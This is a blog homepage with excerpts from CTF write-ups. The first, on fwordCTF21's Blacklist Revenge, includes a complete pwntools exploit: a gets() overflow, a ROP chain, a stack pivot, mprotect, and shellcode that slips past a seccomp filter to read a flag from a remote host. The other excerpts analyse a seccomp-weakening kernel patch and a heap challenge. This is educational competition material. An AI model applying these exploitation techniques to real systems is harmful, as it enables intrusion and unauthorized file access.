<!DOCTYPE html>
<html lang="en">
<title>Home | P-W-N</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="author" content="volticks">
<meta name="generator" content="Jekyll v4.2.0">
<link rel="canonical" href="/">

<link rel="stylesheet" href="/assets/css/frame.css">

<link rel="alternate" href="/feed.xml" type="application/atom+xml" title="P-W-N">







<header>
  <a href="/" class="title">P-W-N</a>
  <nav><a href="/" class="selected">Home</a><a href="/about/" >About</a></nav>

</header>


  
  <article>
    <header>
  <h1><a href="/blacklist-revenge-writeup/">Blacklist Revenge Writeup</a></h1><time datetime="2021-08-29T00:00:00+01:00">August 29, 2021</time>
</header>

    <h1 id="intro">Intro</h1>

<h2 id="chit-chat">Chit-chat</h2>

<p>Been a while, huh?</p>

<p>This is a writeup for the <code class="language-plaintext highlighter-rouge">blacklist-revenge</code> challenge from <a href="https://ctftime.org/event/1405">fwordCTF21</a>. Its a pretty cool challenge, with some lessons to teach, and even though the challenge was, admittedly fairly easy I feel it still has educational value. Thats why i’m here, of course.</p>

<p>My previous statement about the challenge being “fairly easy” sounds quite ironic when you realise that I was not the one who originally solved the challenge; that was someone else on my team. Although I quite believe I <em>could</em> have solved the challenge for the team, had he not been so fast.</p>

<h2 id="the-challenge">The challenge</h2>

<p>Now that i’m done rambling, whats up with the challenge?</p>

<p>The description reads:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>It's time to revenge !
flag is in /home/fbi/flag.txt
Note : There is no stdout/stderr in the server , can you manage it this year?
</code></pre></div></div>

<p>With stdout + stderr disabled, this might pose a bit of a challenge when trying to exfiltrate the flag. 
I did my usual which is running <code class="language-plaintext highlighter-rouge">file</code> and <code class="language-plaintext highlighter-rouge">checksec</code> on the binary, just to see what were dealing with:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[~/D/f/BlackList_Revenge] : file blacklist                                                                          
blacklist: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=890009ffb99771b08ad8ac3971e9aef644bce402, for GNU/Linux 3.2.0, not stripped
[~/D/f/BlackList_Revenge] : checksec --file blacklist                                                        
[*] '/root/Documents/fword21/BlackList_Revenge/blacklist'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre></div></div>

<p>This is already pretty promising; no PIE AND statically linked. This means once we find an exploitable bug we can immediately start ropping, so lets take a look inside.</p>

<h3 id="the-binary">The binary</h3>

<p>Starting from the beginning:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">init_0</span><span class="p">();</span>
  <span class="n">vuln</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>It looks pretty simple, nice. Lets check out <code class="language-plaintext highlighter-rouge">init_0</code> first:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__int64</span> <span class="nf">init_0</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">syscall_arr</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-30h]</span>
  <span class="n">__int64</span> <span class="n">filter</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-10h]</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+2Ch] [rbp-4h]</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">filter</span> <span class="o">=</span> <span class="n">seccomp_init</span><span class="p">(</span><span class="mh">0x7FFF0000LL</span><span class="p">);</span>          <span class="c1">// kill if encountered</span>
  <span class="n">syscall_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>                           <span class="c1">// open</span>
  <span class="n">syscall_arr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x38</span><span class="p">;</span>                        <span class="c1">// clone</span>
  <span class="n">syscall_arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x39</span><span class="p">;</span>                        <span class="c1">// fork</span>
  <span class="n">syscall_arr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3A</span><span class="p">;</span>                        <span class="c1">// vfork</span>
  <span class="n">syscall_arr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3B</span><span class="p">;</span>                        <span class="c1">// execve</span>
  <span class="n">syscall_arr</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x142</span><span class="p">;</span>                       <span class="c1">// execveat</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">5</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
    <span class="p">(</span><span class="n">seccomp_rule_add</span><span class="p">)(</span><span class="n">filter</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">syscall_arr</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">seccomp_load</span><span class="p">(</span><span class="n">filter</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>You can see we disable buffering on stdin + out + err. We then piece together and load a seccomp filter. Here we restrict several syscalls., including <code class="language-plaintext highlighter-rouge">execve</code> and its brother <code class="language-plaintext highlighter-rouge">execveat</code>, so no shells for us ;(. Lets dump the seccomp rules with <code class="language-plaintext highlighter-rouge">seccomp-tools</code> as well, just to be sure:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">~/</span><span class="n">D</span><span class="o">/</span><span class="n">f</span><span class="o">/</span><span class="n">BlackList_Revenge</span><span class="p">]</span> <span class="o">:</span> <span class="n">seccomp</span><span class="o">-</span><span class="n">tools</span> <span class="n">dump</span> <span class="p">.</span><span class="o">/</span><span class="n">blacklist</span> 
 <span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
<span class="o">=================================</span>
 <span class="mo">0000</span><span class="o">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
 <span class="mo">0001</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x0a</span> <span class="mh">0xc000003e</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">ARCH_X86_64</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">0002</span><span class="o">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
 <span class="mo">0003</span><span class="o">:</span> <span class="mh">0x35</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x40000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">&lt;</span> <span class="mh">0x40000000</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0005</span>
 <span class="mo">0004</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x07</span> <span class="mh">0xffffffff</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">0005</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00000002</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">open</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">0006</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x05</span> <span class="mh">0x00</span> <span class="mh">0x00000038</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">clone</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">0007</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x04</span> <span class="mh">0x00</span> <span class="mh">0x00000039</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">fork</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">000</span><span class="mi">8</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x03</span> <span class="mh">0x00</span> <span class="mh">0x0000003a</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">vfork</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">000</span><span class="mi">9</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x02</span> <span class="mh">0x00</span> <span class="mh">0x0000003b</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">execve</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">0010</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x01</span> <span class="mh">0x00</span> <span class="mh">0x00000142</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">execveat</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">0011</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
 <span class="mo">0012</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
</code></pre></div></div>

<p>From the top, we can see they limit syscalls to 64 bit versions rather than 32, pretty sure this is the default, so this means no <code class="language-plaintext highlighter-rouge">int 0x80</code>s allowed, so cant bypass the filter that way.</p>

<p>Lets now take a look at the <code class="language-plaintext highlighter-rouge">vuln</code> function:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">vuln</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-40h] BYREF</span>

  <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Classy, huh? I havent seen <code class="language-plaintext highlighter-rouge">gets()</code> used in a while so it was pretty cool to see it again. So to recap:</p>

<p>We have:</p>
<ul>
  <li>No PIE, and statically linked; many gadgets available to us right out the door.</li>
  <li>Easy bof vulnerability on the stack.</li>
  <li>… But, we cant get a shell, so we have to use some combination of ORW, but using <code class="language-plaintext highlighter-rouge">openat</code> instead of open to net us the flag.</li>
</ul>

<h1 id="exploitation">Exploitation</h1>

<p>My exploit is fairly simple. It has 3 stages:</p>

<ol>
  <li>Overflow buffer, rop together a call to <code class="language-plaintext highlighter-rouge">read</code> into the bss to load a stage 2. I do this because I dont want to deal with <code class="language-plaintext highlighter-rouge">gets()</code> and its badchars.</li>
  <li>Pivot the stack into the bss where a ropchain is waiting.</li>
  <li>The ropchain rwx’s the bss, then jumps to shellcode I had loaded after.</li>
</ol>

<p>Here’s what it looks like:</p>

<p>```py
from pwn import *
import string</p>

<p>context.arch = ‘amd64’</p>

<p>script = ‘’’
break *vuln+29
continue
‘’’</p>

<h1 id="print-out-contents-only-up-to-0x50-bytes-of-it-though-for-some-reason--of-a-file">Print out contents (only up to 0x50 bytes of it though for some reason :/) of a file.</h1>
<p>shellcode = asm(‘’’</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov rax, 0x101
mov rsi, rdi
xor rdi, rdi
xor rdx, rdx
xor r10, r10
syscall

mov rdi, rax
mov rax, 0
mov rsi, rsp
mov rdx, 0x50
syscall

mov rax, 1
mov rdi, 0
syscall

    ''')
</code></pre></div></div>

<p>def main():</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># For our socket shellcode. 
dataseg = 0x00000000004dd000
# Just inside read()
syscall = 0x457a00
# For stack pivot, because fuck gets()
pop_rbp = 0x41ed8f
leave = 0x0000000000401e78

rop = ROP("./blacklist")
elf = ELF("./blacklist")

# This is effected by bachars bcuz gets(), so im gonna load a stage2.
ropchain = flat(
    
    # I CBA dealing with the stack, so bss instead :)
    # read(0, dataseg, 0x1000)
    rop.rdi.address,                                                  
    0,   
    rop.rsi.address,
    dataseg,
    rop.rdx.address,
    0x1000,
    syscall,

    pop_rbp,
    dataseg+0x20, # +0x20 to leave room for filenames n shit
    leave,
        )

# This is not affected by badchars, bcuz read() :).
rop2 = flat(
    
    path := b"/home/fbi/flag.txt\x00",
    b"A"*(0x20 - (len(path) - 8)),
    
    # shellcode here because rop is annoying. 
    # mprotect(dataseg, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC)
    rop.rax.address,
    0x0a,
    rop.rdi.address,
    dataseg,
    rop.rsi.address,
    0x1000,
    rop.rdx.address,
    7,
    syscall,
    
    # Return into our shellcode...
    # Should srop into the somsled somewhere inside the GOT.
    dataseg+125,
    b"\x90"*50,
    shellcode,
    )

#p = process("./blacklist")
# nc 40.71.72.198 1236 
p = remote("40.71.72.198", 1236)
#gdb.attach(p, script)

p.sendline(b"A"*72 + ropchain)

# read() doesnt need a newline 
p.send(rop2)

# We should be recieving some data over stdin, which uses the same socket as stdout for comms with the server. So
# pretty much no difference between the 2.
buf = p.recvall()

# Clean output a lil 
printable = ""
for b in buf:
    for c in string.printable:
        if b == ord(c):
            printable += chr(b)

print(printable)
</code></pre></div></div>

    <div class="more"><a href="/blacklist-revenge-writeup/">read more</a></div>
  </article>

  <article>
    <header>
  <h1><a href="/insecure-seccomp-writeup/">Insecure Seccomp Writeup</a></h1><time datetime="2021-08-06T00:00:00+01:00">August 06, 2021</time>
</header>

    <h1 id="intro">Intro</h1>

<p>This writeup is pretty late, given that <a href="https://ctftime.org/event/1372">UIUCTC 21</a> ended a good few days ago, but now its here.</p>

<p>This was a first for me, and for my team-mate <a href="https://twitter.com/X3eRo0/">X3eRo0</a>; a kernel challenge in a live CTF environment. Although we both finished the kernel section of <a href="https://pwn.college/">pwn.college</a> this was a little different, as you’ll see.</p>

<h2 id="pre-requisites">Pre-requisites</h2>

<p>This writeup assumes that the reader knows what <code class="language-plaintext highlighter-rouge">seccomp</code> is, and what it does along with how it does it. If you don’t, reading through the <a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">man page</a> a little will help with that understanding.</p>

<h2 id="what">What</h2>

<p>The challenge gives us links to a <code class="language-plaintext highlighter-rouge">handout.tar.gz</code> and <code class="language-plaintext highlighter-rouge">starter.c</code>. On extracting the handout, we are greeted with a <code class="language-plaintext highlighter-rouge">challenge</code> folder, and inside that folder are the following files:</p>

<p>` Dockerfile  kernel/  nsjail.cfg  src/ `</p>

<p>We are given a <code class="language-plaintext highlighter-rouge">Dockerfile</code>, <code class="language-plaintext highlighter-rouge">kernel/</code> directory, an nsjail configuration file and a <code class="language-plaintext highlighter-rouge">src/</code> folder. Building this in docker takes a long time, and quite a lot of disk space so if you want to you can skip that process completely and just use:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> nc insecure-seccomp.chal.uiuc.tf 1337<span class="p">;</span> <span class="nb">stty</span> <span class="nt">-raw</span> <span class="nb">echo</span>
</code></pre></div></div>

<p>To connect to the remote service, IF its still up, that is. Anyway, looking in the dockerfile we can get some details about our challenge before even reading the source, in particular:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>COPY kernel/kconfig /kernel/linux-5.12.14/.config
COPY kernel/patch /tmp/kernel.patch
COPY kernel/CVE-2021-33909.patch /tmp/CVE-2021-33909.patch
RUN patch -p1 -d /kernel/linux-5.12.14 &lt; /tmp/CVE-2021-33909.patch
RUN patch -p1 -d /kernel/linux-5.12.14 &lt; /tmp/kernel.patch
</code></pre></div></div>

<p>Here we can see the some files, such as the <code class="language-plaintext highlighter-rouge">kconfig</code> which contains flags and build instructions for our kernel, and 2 other files, <code class="language-plaintext highlighter-rouge">patch</code> and <code class="language-plaintext highlighter-rouge">CVE-2021-33909.patch</code>. The latter provides a fix for a recent CVE, and is not relevant on our end, however the former is a bit more interesting:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>diff --git a/init/main.c b/init/main.c                                                                                               
index 5bd1a25f1d6f..ee7dc4a65c08 100644
--- a/init/main.c
+++ b/init/main.c
@@ -1490,7 +1490,7 @@ void __init console_on_rootfs(void)
        struct file *file = filp_open("/dev/console", O_RDWR, 0);

        if (IS_ERR(file)) {
-               pr_err("Warning: unable to open an initial console.\n");
+               // pr_err("Warning: unable to open an initial console.\n");
                return;
        }
        init_dup(file);
diff --git a/kernel/seccomp.c b/kernel/seccomp.c
index 93684cc63285..e8574297803c 100644
--- a/kernel/seccomp.c
+++ b/kernel/seccomp.c
@@ -648,9 +648,9 @@ static struct seccomp_filter *seccomp_prepare_filter(struct sock_fprog *fprog)
         * This avoids scenarios where unprivileged tasks can affect the
         * behavior of privileged children.
         */
-       if (!task_no_new_privs(current) &amp;&amp;
-                       !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN))
-               return ERR_PTR(-EACCES);
+       // if (!task_no_new_privs(current) &amp;&amp;
+       //              !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN))
+       //      return ERR_PTR(-EACCES);

        /* Allocate a new seccomp_filter */
        sfilter = kzalloc(sizeof(*sfilter), GFP_KERNEL | __GFP_NOWARN);
</code></pre></div></div>

<p>In particular, look closely at these lines:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>* This avoids scenarios where unprivileged tasks can affect the
* behavior of privileged children.
*/
-       if (!task_no_new_privs(current) &amp;&amp;
-                       !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN))
-               return ERR_PTR(-EACCES);
+       // if (!task_no_new_privs(current) &amp;&amp;
+       //              !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN))
+       //      return ERR_PTR(-EACCES);
</code></pre></div></div>

<p>It looks like before our kernel is compiled, the <code class="language-plaintext highlighter-rouge">patch</code> command is used comment some lines out, but what is the significance of these lines? Well, googling <code class="language-plaintext highlighter-rouge">test_no_new_privs()</code> the first result is <a href="http://bricktou.cn/include/linux/schedtask_no_new_privs_en.html">this</a>, here we can see a function prototype and a description for what purpose this has:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="n">bool</span> <span class="n">task_no_new_privs</span><span class="p">(</span><span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
</code></pre></div></div>

<p>The description states: <code class="language-plaintext highlighter-rouge">Determine whether a bit is set</code>. Of course this makes sense given the function returns a Boolean. Now lets look at the implementation. The latter also links to a source snipped, however our kernel version is different, so we can look <a href="https://elixir.bootlin.com/linux/v5.12.14/source/include/linux/sched.h#L1646">here</a> instead:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Per-process atomic flags. */</span>
<span class="cp">#define PFA_NO_NEW_PRIVS		0	</span><span class="cm">/* May not gain new privileges. */</span><span class="cp">
#define PFA_SPREAD_PAGE			1	</span><span class="cm">/* Spread page cache over cpuset */</span><span class="cp">
#define PFA_SPREAD_SLAB			2	</span><span class="cm">/* Spread some slab caches over cpuset */</span><span class="cp">
#define PFA_SPEC_SSB_DISABLE		3	</span><span class="cm">/* Speculative Store Bypass disabled */</span><span class="cp">
#define PFA_SPEC_SSB_FORCE_DISABLE	4	</span><span class="cm">/* Speculative Store Bypass force disabled*/</span><span class="cp">
#define PFA_SPEC_IB_DISABLE		5	</span><span class="cm">/* Indirect branch speculation restricted */</span><span class="cp">
#define PFA_SPEC_IB_FORCE_DISABLE	6	</span><span class="cm">/* Indirect branch speculation permanently restricted */</span><span class="cp">
#define PFA_SPEC_SSB_NOEXEC		7	</span><span class="cm">/* Speculative Store Bypass clear on execve() */</span><span class="cp">
</span>
<span class="cp">#define TASK_PFA_TEST(name, func)					\
	static inline bool task_##func(struct task_struct *p)		\
	{ return test_bit(PFA_##name, &amp;p-&gt;atomic_flags); }
</span>
<span class="cp">#define TASK_PFA_SET(name, func)					\
	static inline void task_set_##func(struct task_struct *p)	\
	{ set_bit(PFA_##name, &amp;p-&gt;atomic_flags); }
</span>
<span class="cp">#define TASK_PFA_CLEAR(name, func)					\
	static inline void task_clear_##func(struct task_struct *p)	\
	{ clear_bit(PFA_##name, &amp;p-&gt;atomic_flags); }
</span>
<span class="n">TASK_PFA_TEST</span><span class="p">(</span><span class="n">NO_NEW_PRIVS</span><span class="p">,</span> <span class="n">no_new_privs</span><span class="p">)</span>
</code></pre></div></div>

<p>Specifically, the definition is on the last line. Doesn’t much look like a function definition, does it? But it gets a bit clearer when you look at the macro being used:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define TASK_PFA_TEST(name, func)                    \
    static inline bool task_##func(struct task_struct *p)        \
    { return test_bit(PFA_##name, &amp;p-&gt;atomic_flags); }
</span></code></pre></div></div>

<p>It takes a <code class="language-plaintext highlighter-rouge">name</code> and a <code class="language-plaintext highlighter-rouge">func</code>, then based on that will use even more macros to stitch together a function name, we pass in <code class="language-plaintext highlighter-rouge">NO_NEW_PRIVS</code> as our <code class="language-plaintext highlighter-rouge">name</code>, and <code class="language-plaintext highlighter-rouge">no_new_privs</code> as our <code class="language-plaintext highlighter-rouge">func</code>, and based on that it will give us a function name of <code class="language-plaintext highlighter-rouge">task_no_new_privs</code>.</p>

<p>If we look inside the function, we can see that it is, in fact testing a bit. In this case <code class="language-plaintext highlighter-rouge">PFA_NO_NEW_PRIVS</code>, or ‘1’. So what is the purpose of this bit, exactly?</p>

<p>Again, by googling we can find <a href="https://unix.stackexchange.com/questions/562260/why-we-need-to-set-no-new-privs-while-before-calling-seccomp-mode-filter">this</a> answer on stack overflow. The gist is:</p>

<p>“The no_new_privs bit is a property of the process which, if set, tells the kernel to not employ privileges escalation mechanisms like SUID bit (so, invoking things like sudo(8) will not work at all), so it is safe to allow the unprivileged process with this bit set to use seccomp filters: this process will not have any possibility to escalate privileges even temporarily, thus, will not be able to “hijack” these privileges.”</p>

<p><code class="language-plaintext highlighter-rouge">seccomp</code> has a lot of features, one of which is the ability to skip a syscall, and set an arbitrary <code class="language-plaintext highlighter-rouge">ERRNO</code>/return value from said syscall. Look at this code, taken from the answer:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Make the `openat(2)` syscall always "succeed".</span>
<span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">seccomp</span><span class="p">,</span> <span class="n">SCMP_ACT_ERRNO</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">openat</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
</code></pre></div></div>

<p>Once this rule is applied, the <code class="language-plaintext highlighter-rouge">openat</code> syscall will return ‘0’ regardless of whether the file in question actually exists. This means that checks in the program that expect a ‘-1’ on failure will be invalidated and depending on the depth of error checking may just assume the file exists, when it in fact does not.</p>

<p>Now with that knowledge we can look back on the patched code from our kernel:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">task_no_new_privs</span><span class="p">(</span><span class="n">current</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
<span class="o">-</span>                       <span class="o">!</span><span class="n">ns_capable_noaudit</span><span class="p">(</span><span class="n">current_user_ns</span><span class="p">(),</span> <span class="n">CAP_SYS_ADMIN</span><span class="p">))</span>
<span class="o">-</span>               <span class="k">return</span> <span class="nf">ERR_PTR</span><span class="p">(</span><span class="o">-</span><span class="n">EACCES</span><span class="p">);</span>
</code></pre></div></div>

<p>So, if the <code class="language-plaintext highlighter-rouge">no_new_privs</code> bit is NOT set (meaning the process to which the seccomp rule is being applied IS setuid/running under sudo) AND the current process was not started by root, <code class="language-plaintext highlighter-rouge">seccomp</code> will fail before loading the filter/rule, meaning that no meddling with the return value is possible where we may have something to gain from it.</p>

<p>But now remember the patch:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">+</span>       <span class="c1">// if (!task_no_new_privs(current) &amp;&amp;</span>
<span class="o">+</span>       <span class="c1">//              !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN))</span>
<span class="o">+</span>       <span class="c1">//      return ERR_PTR(-EACCES);</span>
</code></pre></div></div>

<p>This has been undone. Any process, regardless of setuid status will have the rule applied. This will be incredibly important moving forward, so don’t forget :).</p>

<h2 id="the-challenge">The challenge</h2>

<p>Now that we have covered all that, we can get to the challenge sources. Lets first take a look at <code class="language-plaintext highlighter-rouge">jail.c</code>:</p>

    <div class="more"><a href="/insecure-seccomp-writeup/">read more</a></div>
  </article>

  <article>
    <header>
  <h1><a href="/memory-heist-writeup/">Memory Heist Writeup</a></h1><time datetime="2021-07-28T00:00:00+01:00">July 28, 2021</time>
</header>

    
<h1 id="intro">Intro</h1>

<p>So <a href="https://ctftime.org/event/1382">IJCTF</a> happened recently, taking place over the weekend from the 24th of June. It had some pretty damn good challenges, and was a great way for me and the rest of <a href="https://ctftime.org/team/116018">zh3r0</a> to rejuvenate after being battered by the hellhole that was google CTF. So lets get into one of these challenges.</p>

<p><code class="language-plaintext highlighter-rouge">memory-heist</code> specifically was solved by my team-mate. His solution was quite baffling at first but after debugging and running through it a few times I understood. This is the exploit I will be using (and explaining) during this writeup, so I hope it can help you understand the awesome way this was exploited.</p>

<p>As usual, the exploit script is in the folder with this writeup (if this ends up on GitHub, anyway]). So if that’s all you need, there it is.</p>

<p>With that out of the way, lets take a look at the challenge binary.</p>

<h2 id="setup">Setup</h2>

<p>… But before we can do that there is a problem. Stripped libc. If you don’t mind not having access to <code class="language-plaintext highlighter-rouge">pwndbg</code>s <code class="language-plaintext highlighter-rouge">heap</code> command for looking at heap chunks, you can skip this part, but this is gonna get pretty technical so I would recommend following. You can get the debug symbols by running:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://es.archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6-dbg_2.31-0ubuntu9.2_amd64.deb
</code></pre></div></div>

<p>And then</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpkg <span class="nt">-x</span> libc6-dbg_2.31-0ubuntu9.2_amd64.deb <span class="nb">.</span>
</code></pre></div></div>

<p>To extract them to the current directory. Next I used <code class="language-plaintext highlighter-rouge">eu-unstrip</code> to copy the debug symbols from the unstripped libc, over to the stripped one provided, alternatively you could just replace the libc, but I only thought of that now -_-.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>eu-unstrip ./libc.so.6 usr/lib/debug/lib/x86_64-linux-gnu/libc-2.31.so <span class="nt">-o</span> ./libc.so.6.dbg
</code></pre></div></div>

<p>Now you should have <code class="language-plaintext highlighter-rouge">libc.so.6.dbg</code> which you can exchange with the provided libc as you wish. No need for any patching because the challenge creator’s had the foresight to load the linker AND libc from the current directory. Thanks guys.</p>

<h1 id="what">What</h1>

<p>First, lets see the challenge description:</p>

<p><code class="language-plaintext highlighter-rouge">Hereee! You got both printf() and UAF. Lets see if you can get the flag :)</code></p>

<p>Very bold… Lets see about that.</p>

<p>Now that we have that out of the way we can take a look at how the binary runs, and see what it does, then we can delve in with the disassembler/de-compiler of your choice. First lets run and explore some program functionality:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@nomu:~/D/I/memory_heist
❯❯ ./memory-heist                                                                                                                    

Welcome to Memory Heist.

